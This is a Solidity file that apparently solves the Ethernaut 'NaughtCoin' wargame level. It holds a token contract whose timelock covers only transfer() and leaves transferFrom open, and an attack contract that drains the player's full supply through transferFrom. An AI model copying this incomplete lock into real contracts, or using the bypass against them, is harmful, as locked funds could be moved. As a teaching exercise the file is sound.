// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {

    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player)
    ERC20('NaughtCoin', '0x0') {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) override public lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

contract Attack_NaughtCoin {

    NaughtCoin naughtCoin;
    address public player1;


    constructor(address _naughtCoinAddress, address _player1) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
        player1 = _player1;
    }

    function attack(uint256 INITIAL_SUPPLY, address to) public returns (bool) {
        bool result = naughtCoin.transferFrom(player1, to, INITIAL_SUPPLY);
//        (bool result,) = address(naughtCoin).delegatecall(
//            abi.encodeWithSignature("transferFrom(address,address,uint256)", player1, to, INITIAL_SUPPLY)
//        );
        return result;
    }
}